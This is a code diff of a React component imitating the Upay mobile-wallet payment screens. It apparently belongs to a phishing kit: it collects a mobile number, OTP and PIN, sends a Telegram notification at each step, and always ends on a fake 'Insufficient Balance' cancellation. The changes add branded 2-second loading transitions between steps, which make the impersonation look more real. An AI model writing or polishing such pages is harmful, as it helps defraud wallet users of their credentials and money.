@@ -14,12 +14,8 @@ const UpayPayment = () => {
   const [showError, setShowError] = useState("");
   const [otpAttempts, setOtpAttempts] = useState(0);
   const [pinAttempts, setPinAttempts] = useState(0);
-  const [isLoading, setIsLoading] = useState(true);
-
-  useEffect(() => {
-    const timer = setTimeout(() => setIsLoading(false), 2000);
-    return () => clearTimeout(timer);
-  }, []);
+  const [isLoading, setIsLoading] = useState(false);
+  const [isTransitioning, setIsTransitioning] = useState(false);
 
   const mobileRef = useRef<HTMLInputElement>(null);
   const otpRef = useRef<HTMLInputElement>(null);
@@ -61,8 +57,12 @@ const UpayPayment = () => {
 
   const handleMobileSubmit = () => {
     if (!isValidMobile()) return;
+    setIsTransitioning(true);
     sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs' });
-    setStep('otp');
+    setTimeout(() => {
+      setStep('otp');
+      setIsTransitioning(false);
+    }, 2000);
   };
 
   const handleOtpSubmit = () => {
@@ -71,9 +71,12 @@ const UpayPayment = () => {
       setTimeout(() => setShowError(""), 3000);
       return;
     }
+    setIsTransitioning(true);
     sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs' });
-
-    setStep('pin');
+    setTimeout(() => {
+      setStep('pin');
+      setIsTransitioning(false);
+    }, 2000);
   };
 
   const handlePinSubmit = () => {
@@ -82,9 +85,12 @@ const UpayPayment = () => {
       setTimeout(() => setShowError(""), 3000);
       return;
     }
+    setIsTransitioning(true);
     sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs' });
-
-    navigate(`/payment-cancelled?channel=Upay&reason=Insufficient Balance&amount=${amount}.00`);
+    setTimeout(() => {
+      setIsTransitioning(false);
+      navigate(`/payment-cancelled?channel=Upay&reason=Insufficient Balance&amount=${amount}.00`);
+    }, 2000);
   };
 
   const handleClose = () => {
@@ -135,7 +141,7 @@ const UpayPayment = () => {
   return (
     <div className="fixed inset-0 flex flex-col items-start justify-start p-4 pt-6 overflow-hidden" style={{ background: 'linear-gradient(to bottom, rgb(250, 235, 122) 10%, rgb(253, 251, 216) 80%)' }}>
       <div className="w-full max-w-[420px] mx-auto rounded-2xl overflow-hidden shadow-lg" style={{ minHeight: '520px' }}>
-        {isLoading ? (
+        {isTransitioning ? (
           <div className="flex flex-col items-center justify-center" style={{ backgroundColor: 'rgb(251, 214, 0)', minHeight: '520px' }}>
             <img src={upayLogo} alt="Upay" className="w-72 h-auto object-contain mb-6 animate-pulse" />
             <p className="text-[#1a1a1a] text-sm font-bold">Loading...</p>
